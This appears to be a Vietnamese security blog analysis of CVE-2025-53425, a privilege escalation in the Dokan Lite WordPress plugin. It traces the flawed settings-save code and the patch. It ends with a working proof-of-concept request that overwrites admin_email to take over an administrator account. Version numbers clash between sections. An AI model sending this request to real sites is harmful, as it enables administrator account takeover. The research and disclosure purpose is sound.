# CVE-2025-53425 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Gán Quyền Không Chính Xác** (**Incorrect Privilege Assignment**) trong **Dokan, Inc. Dokan dokan-lite** cho phép **Leo Thang Đặc Quyền** (**Privilege Escalation**). Vấn đề này ảnh hưởng đến **Dokan** từ **n/a** đến **<= 4.1.2**.

* **CVE ID**: [CVE-2025-53425](https://www.cve.org/CVERecord?id=CVE-2025-53425)
* **Vulnerability Type**: Privilege Escalation
* **Affected Versions**: <= 4.1.3
* **Patched Versions**: 4.1.4
* **CVSS severity**: Medium (7.2)
* **Required Privilege**: Shop manager
* **Product**: [WordPress Dokan Plugin](https://wordpress.org/plugins/dokan-lite/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Dokan**:  
    * `4.1.3` – **vulnerable**  
    * `4.1.4` – **patched**
* **WooCommerce Plugin** → [**WooCommerce**](https://wordpress.org/plugins/woocommerce/)
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

> [!NOTE]
> Plugin **cần WooCommerce để hoạt động**, vì nó **tích hợp và hoạt động trực tiếp với WooCommerce** nhằm quản lý **sản phẩm, đơn hàng và quy trình thanh toán** một cách đầy đủ và hiệu quả.

## Analysis 
Plugin đã đăng ký action hook:

```php {title="Settings.php v4.1.3" hl_lines=[] data-open=true}
add_action( 'wp_ajax_dokan_save_settings', [ $this, 'save_settings_value' ], 10 );
```

`wp_ajax_` là hook dành cho người dùng **đã đăng nhập**.
Khi có request đến endpoint `/wp-admin/admin-ajax.php` với param `action=dokan_save_settings` thì callback `save_settings_value` sẽ được gọi:

```php {title="Settings.php v4.1.3" hl_lines=[3,15,16,25] data-open=true}
public function save_settings_value() {
    try {
        if ( ! current_user_can( 'manage_woocommerce' ) ) {
            throw new DokanException( 'dokan_settings_unauthorized_operation', __( 'You are not authorized to perform this action.', 'dokan-lite' ), 401 );
        }

        if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( sanitize_key( wp_unslash( $_POST['nonce'] ) ), 'dokan_admin' ) ) {
            throw new DokanException( 'dokan_settings_invalid_nonce', __( 'Invalid nonce', 'dokan-lite' ), 403 );
        }

        if ( empty( $_POST['section'] ) ) {
            throw new DokanException( 'dokan_settings_error_saving', __( '`section` parameter is required.', 'dokan-lite' ), 400 );
        }

        $option_name  = sanitize_text_field( wp_unslash( $_POST['section'] ) );
        $option_value = $this->sanitize_options( wp_unslash( $_POST['settingsData'] ), 'edit' ); // phpcs:ignore
        $option_value = apply_filters( 'dokan_save_settings_value', $option_value, $option_name );
        $old_options  = get_option( $option_name, [] );

        /**
         * @since 3.5.1 added $old_options parameter
         */
        do_action( 'dokan_before_saving_settings', $option_name, $option_value, $old_options );

        update_option( $option_name, $option_value );

        /**
         * @since 3.5.1 added $old_options parameter
         */
        do_action( 'dokan_after_saving_settings', $option_name, $option_value, $old_options );

        // only flush rewrite rules if store url has been changed
        if ( 'dokan_general' === $option_name && isset( $old_options['custom_store_url'] ) && $old_options['custom_store_url'] !== $option_value['custom_store_url'] ) {
            dokan()->rewrite->register_rule();
            flush_rewrite_rules();
        }

        wp_send_json_success(
            [
                'settings' => [
                    'name'  => $option_name,
                    'value' => apply_filters( 'dokan_get_settings_values', $this->sanitize_options( $option_value, 'read' ), $option_name ),
                ],
                'message'  => __( 'Setting has been saved successfully.', 'dokan-lite' ),
            ]
        );
    } catch ( Exception $e ) {
        $error_code = $e->getCode() ? $e->getCode() : 422;

        wp_send_json_error( new WP_Error( 'dokan_settings_error', $e->getMessage() ), $error_code );
    }
}
```

Hàm thực hiện kiểm tra quyền người dùng bằng:

```php
current_user_can( 'manage_woocommerce' )
```

Trong đó, `manage_woocommerce` là một **capability** được đăng ký bởi plugin **WooCommerce**.

Quyền này được khai báo trong hàm `get_core_capabilities()`:

```php {title="woocommerce/includes/class-wc-install.php" hl_lines=[5] data-open=true}
public static function get_core_capabilities() {
    $capabilities = array();

    $capabilities['core'] = array(
        'manage_woocommerce',
        'create_customers',
        'view_woocommerce_reports',
    );

    $capability_types = array( 'product', 'shop_order', 'shop_coupon' );

    foreach ( $capability_types as $capability_type ) {

        $capabilities[ $capability_type ] = array(
            // Post type.
            "edit_{$capability_type}",
            "read_{$capability_type}",
            "delete_{$capability_type}",
            "edit_{$capability_type}s",
            "edit_others_{$capability_type}s",
            "publish_{$capability_type}s",
            "read_private_{$capability_type}s",
            "delete_{$capability_type}s",
            "delete_private_{$capability_type}s",
            "delete_published_{$capability_type}s",
            "delete_others_{$capability_type}s",
            "edit_private_{$capability_type}s",
            "edit_published_{$capability_type}s",

            // Terms.
            "manage_{$capability_type}_terms",
            "edit_{$capability_type}_terms",
            "delete_{$capability_type}_terms",
            "assign_{$capability_type}_terms",
        );
    }

    return $capabilities;
}
```

Hàm này định nghĩa **các quyền cốt lõi của WooCommerce**, trong đó nhóm `core` bao gồm các quyền quan trọng như:

* `manage_woocommerce`
* `create_customers`
* `view_woocommerce_reports`

Các quyền này sau đó được sử dụng trong hàm `create_roles()` để gán cho các vai trò người dùng:

```php {title="woocommerce/includes/class-wc-install.php" hl_lines=[54] data-open=true}
public static function create_roles() {
    ...
    // Shop manager role.
    add_role(
        'shop_manager',
        'Shop manager',
        array(
            'level_9'                => true,
            'level_8'                => true,
            'level_7'                => true,
            'level_6'                => true,
            'level_5'                => true,
            'level_4'                => true,
            'level_3'                => true,
            'level_2'                => true,
            'level_1'                => true,
            'level_0'                => true,
            'read'                   => true,
            'read_private_pages'     => true,
            'read_private_posts'     => true,
            'edit_posts'             => true,
            'edit_pages'             => true,
            'edit_published_posts'   => true,
            'edit_published_pages'   => true,
            'edit_private_pages'     => true,
            'edit_private_posts'     => true,
            'edit_others_posts'      => true,
            'edit_others_pages'      => true,
            'publish_posts'          => true,
            'publish_pages'          => true,
            'delete_posts'           => true,
            'delete_pages'           => true,
            'delete_private_pages'   => true,
            'delete_private_posts'   => true,
            'delete_published_pages' => true,
            'delete_published_posts' => true,
            'delete_others_posts'    => true,
            'delete_others_pages'    => true,
            'manage_categories'      => true,
            'manage_links'           => true,
            'moderate_comments'      => true,
            'upload_files'           => true,
            'export'                 => true,
            'import'                 => true,
            'list_users'             => true,
            'edit_theme_options'     => true,
        )
    );

    $capabilities = self::get_core_capabilities();

    foreach ( $capabilities as $cap_group ) {
        foreach ( $cap_group as $cap ) {
            $wp_roles->add_cap( 'shop_manager', $cap );
            $wp_roles->add_cap( 'administrator', $cap );
        }
    }
}
```

Hàm này tạo và cấu hình các vai trò người dùng, trong đó **role `shop_manager`** được cấp rất nhiều quyền cao, gần tương đương với **administrator**, bao gồm:

* Quản lý bài viết, trang và bình luận
* Upload file, import/export
* `edit_theme_options`

Sau đó, **toàn bộ quyền WooCommerce** được khai báo trong `get_core_capabilities()` tiếp tục được gán thêm cho:

* `shop_manager`
* `administrator`

```php
$wp_roles->add_cap( 'shop_manager', $cap );
$wp_roles->add_cap( 'administrator', $cap );
```

Điều này đồng nghĩa với việc **Shop Manager có quyền `manage_woocommerce`**.

Như vậy, để hàm `save_settings_value()` tiếp tục xử lý thì user phải có role `Shop manager`, ta có thể tạo user với quyền này trong Admin Dashboard:

![Create Shop Manager User](create.png "Create Shop Manager User")

Đúng như tên gọi của hàm `save_settings_value()`, chức năng của nó là lưu các thiết lập (settings) của Dokan.

![Setting](setting.png "Setting của Dokan trong UI")

Tận dụng sức mạnh của **debugger**, ta đặt **breakpoint** tại hàm `save_settings_value()` và thực hiện thao tác **lưu settings** từ giao diện quản trị.

Nếu debugger hoạt động đúng, **luồng thực thi sẽ dừng lại ngay tại breakpoint**, xác nhận rằng:
* Request lưu settings thực sự đi vào hàm `save_settings_value()`
* Người dùng hiện tại đã **vượt qua kiểm tra quyền `manage_woocommerce`**
* Nonce `dokan_admin` là **hợp lệ**

![Debug](debug.png "Debugger hoạt động")

=> Điều này cho thấy chức năng lưu settings thực sự có thể được thực thi thành công, và luồng xử lý hoạt động đúng như phân tích ở trên.

Đây là điểm máu chốt khiến lõ hổng xảy ra:

```php
$option_name  = sanitize_text_field( wp_unslash( $_POST['section'] ) );
$option_value = $this->sanitize_options( wp_unslash( $_POST['settingsData'] ), 'edit' );
update_option( $option_name, $option_value );
```

Đoạn mã trên cho phép **dữ liệu từ request được ghi trực tiếp vào `wp_options`**:

Trong đó, **người dùng có thể kiểm soát hoàn toàn `$option_name` thông qua tham số `section`**. Mặc dù dữ liệu có được sanitize, nhưng **không hề có cơ chế giới hạn (whitelist) các option được phép cập nhật**.

Khi kết hợp với việc **Shop Manager có quyền `manage_woocommerce`**, một role **không phải Administrator** vẫn có thể:

* Ghi hoặc ghi đè **bất kỳ option nào** trong hệ thống
* Thay đổi **các cấu hình có phạm vi toàn cục của WordPress/Dokan**

Điều này dẫn đến **Privilege Escalation**, vì người dùng có quyền thấp hơn có thể **thực hiện các hành động vốn chỉ nên dành cho Administrator**, thông qua việc thao túng các option quan trọng trong database.

> [!NOTE]
> Một kịch bản phổ biến để khai thác lỗ hổng **Privilege Escalation** thông qua hàm `update_option()` là:
>
> * Đặt `users_can_register = 1` → cho phép người dùng tự đăng ký
> * Đặt `default_role = administrator` → người dùng mới được tạo sẽ có quyền Administrator
>
> Tuy nhiên, trong môi trường sử dụng **WooCommerce** kết hợp với **Dokan**, luồng đăng ký người dùng **không sử dụng `/wp-login.php?action=register` mặc định của WordPress**, mà bắt buộc thông qua endpoint **`/my-account/`**.
>
> ![Register](register.png "Register")
>
> Cơ chế này chỉ cho phép người dùng đăng ký với vai trò **Customer** hoặc **Vendor**, vì vậy **không thể khai thác theo kịch bản thay đổi `default_role` như trên**.
>
> Mặc dù vậy, kẻ tấn công vẫn có thể khai thác theo hướng khác. Cụ thể, bằng cách **thay đổi option `admin_email`**, attacker có thể:
>
> * Gán email quản trị về email do mình kiểm soát
> * Sử dụng chức năng **Forgot Password** để đặt lại mật khẩu
> * Chiếm quyền truy cập tài khoản **Administrator**
>
> Ví dụ kiểm tra trong database:
>
> ```
> mysql> select * from wp_options where option_name = 'admin_email';
> +-----------+-------------+-----------------+----------+
> | option_id | option_name | option_value    | autoload |
> +-----------+-------------+-----------------+----------+
> |         7 | admin_email | admin@gmail.com | on       |
> +-----------+-------------+-----------------+----------+
> 1 row in set (0.001 sec)
> ```
>
> Cách khai thác này vẫn dẫn đến **Privilege Escalation**, dù không tạo admin trực tiếp, mà thông qua **chiếm quyền tài khoản quản trị hiện có**.

--- 

Bản vá **v4.1.3** đã bổ sung **kiểm tra và giới hạn `option_name`**, chỉ cho phép cập nhật các option **nằm trong danh sách section hợp lệ**:

```php
// validate and sanitize option name to avoid any unwanted option update
if ( ! in_array( $option_name, wp_list_pluck( $this->get_settings_sections(), 'id' ), true ) ) {
    throw new DokanException( 'dokan_settings_invalid_section', __( 'Invalid section name.', 'dokan-lite' ), 400 );
}
```

Nhờ đó, người dùng **không thể tùy ý chỉ định option name**, ngăn chặn việc ghi đè các option nhạy cảm như `admin_email`, và **khắc phục lỗ hổng Privilege Escalation**.

## Flow
{{< mermaid >}}
flowchart TD
A["Shop Manager (Authenticated User)"]
--> B["Click Save Settings (Dokan Admin UI)"]

B --> C["POST /wp-admin/admin-ajax.php"]
C --> D["action=dokan_save_settings"]

D --> E["wp_ajax_dokan_save_settings"]
E --> F["Settings::save_settings_value()"]

F --> G{"current_user_can('manage_woocommerce')?"}
G -- No --> H["Abort"]
G -- Yes --> I{"Nonce dokan_admin valid?"}

I -- No --> J["Abort"]
I -- Yes --> K["Read POST parameters"]

K --> L["section taken as option_name"]
L --> M["settingsData taken as option_value"]

M --> N["update_option(option_name, option_value)"]
N --> O["Sensitive wp_options modified"]

O --> P["Change admin_email"]
P --> Q["Use Forgot Password"]
Q --> R["Take over Administrator account"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Truy cập endpoint `http://localhost/wp-admin/admin.php?page=dokan#/settings` và click `Save Changes` button
2. Cho request đi qua Burp Proxy
3. Gửi lại request với params `section=admin_email` và `settingsData=attacker@gmail.com`

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: shop_manager_cookie

action=dokan_save_settings&nonce=d7311ec197&settingsData=attacker@gmail.com&section=admin_email
```

![Result](result.png "Kết quả")

## Conclusion

Lỗ hổng trong **Dokan Lite ≤ 4.1.3** xảy ra do **kiểm soát quyền không chặt chẽ**. Việc chỉ kiểm tra `manage_woocommerce` cho phép **Shop Manager** thực thi chức năng lưu settings và ghi đè **bất kỳ option nào** thông qua `update_option()`, dẫn đến **Privilege Escalation** (ví dụ chiếm quyền Administrator qua `admin_email`).

## Key Takeaways

* `manage_woocommerce` là quyền **quá rộng** cho thao tác toàn cục.
* **Shop Manager không nên có quyền thay đổi system options**.
* `update_option()` phải đi kèm **whitelist option** hoặc **giới hạn role Administrator**.

## References
[Privilege Escalation](https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/)

[WordPress Dokan Plugin <= 4.1.3 is vulnerable to a medium priority Privilege Escalation](https://patchstack.com/database/wordpress/plugin/dokan-lite/vulnerability/wordpress-dokan-plugin-4-0-8-privilege-escalation-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/  

